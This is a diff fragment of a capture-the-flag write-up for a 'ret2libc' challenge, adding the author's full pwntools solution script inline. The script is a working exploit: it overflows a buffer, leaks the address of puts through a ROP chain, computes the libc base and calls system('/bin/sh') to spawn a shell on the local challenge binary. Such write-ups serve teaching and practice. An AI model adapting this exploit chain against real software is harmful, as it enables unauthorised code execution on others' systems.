@@ -74,5 +74,41 @@ conn.send(b' '*56 + p64(poprdi) + p64(binsh) + p64(ret) + p64(libcoff + libc.sym
 conn.interactive()
 ```
 
-The full solution code is available here at `solution.py`. Please ping me on 
+The full solution code is available below. Please ping me on 
 Discord (`garrettgu10#8125`)if any part of my writeup needs clarification ^^
+```
+from pwn import *
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+e = ELF("ret2libc")
+
+rop = ROP(e)
+poprdi = rop.find_gadget(["pop rdi", "ret"])[0]
+ret = rop.find_gadget(["ret"])[0]
+
+pltputs = 0x401050
+
+conn = process("ret2libc")
+conn.recvline()
+
+conn.send(b' '*56 + p64(poprdi) + p64(e.got['puts']) + p64(pltputs) + p64(e.symbols['main']) + b'\n')
+
+conn.recvline()
+conn.recvline()
+
+leaked_puts = conn.recvline()[:-1]
+leaked_puts = leaked_puts + b'\x00' * (8 - len(leaked_puts))
+
+puts = u64(leaked_puts)
+
+print(hex(puts))
+
+libcoff = puts - libc.symbols['puts']
+binsh = next(libc.search(b'/bin/sh')) + libcoff
+
+print(hex(libcoff))
+
+conn.send(b' '*56 + p64(poprdi) + p64(binsh) + p64(ret) + p64(libcoff + libc.symbols['system']) + b'\n')
+
+conn.interactive()
+```
